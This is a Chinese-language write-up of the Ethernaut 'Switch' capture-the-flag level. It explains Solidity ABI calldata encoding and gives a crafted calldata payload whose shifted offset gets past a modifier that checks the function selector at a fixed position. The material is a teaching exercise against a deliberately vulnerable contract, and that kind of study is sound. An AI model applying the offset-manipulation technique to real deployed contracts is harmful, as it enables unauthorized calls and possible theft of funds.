# Switch

## Reference
[Switch](https://ethernaut.openzeppelin.com/level/29)

[Switch.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/29-Switch/Switch.sol)

## 目标
flip switch

## 分析
## Calldata
1. 静态参数(int,uint,address,bool,bytes-n,tuples)高位补0，编码成256bits.
2. 动态参数编码(string,bytes,array)分三部分：
   1. 第一部分的256bits(32位)表明 offset,calldata的起始位置
   2. 第二部分的256bits(32位)表明 length,calldata中动态参数的长度
   3. 第三部分就是动态参数，不满32位的在后面补0
### Examples
```solidity
contract Example {
    function transfer(bytes memory data, address to) external;
}
//data: 0x1234
//to: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
```
其中，to地址作为静态类型，bytes作为动态类型，编码为：

`0xbba1b1cd`+`0000000000000000000000000000000000000000000000000000000000000040`+`0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f`+`0000000000000000000000000000000000000000000000000000000000000002`+`1234000000000000000000000000000000000000000000000000000000000000`
其中：
```json
0x

function selector (transfer):
Bba1b1cd

offset of the 'data' param (64 in decimal):
0000000000000000000000000000000000000000000000000000000000000040 

address param 'to':
0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f 

length of the 'data' param:
0000000000000000000000000000000000000000000000000000000000000002 

value of the 'data' param:
1234000000000000000000000000000000000000000000000000000000000000
```

### flipSwitch函数
```solidity
 function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

modifier onlyOff() {
        // you can use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }
```
1. onlyOff 修饰符要求函数调用传递的参数中 从index=68处取4个字节的数据 等于 `bytes4(keccak256("turnSwitchOff()"))`
2. 因此，传递的是数据仅需要保证 1 中的条件，但是实际调用的参数`bytes4(keccak256("turnSwitchOn()"))`可以往后放：
```json
function selector:
30c13ade

offset, now = 96-bytes:
0000000000000000000000000000000000000000000000000000000000000060 

extra bytes:
0000000000000000000000000000000000000000000000000000000000000000 

here is the check at 68 byte (used only for the check, not relevant for the external call made by our function):
20606e1500000000000000000000000000000000000000000000000000000000

length of the data:
0000000000000000000000000000000000000000000000000000000000000004 

data that contains the selector of the function that will be called from our function:
76227e1200000000000000000000000000000000000000000000000000000000 
```

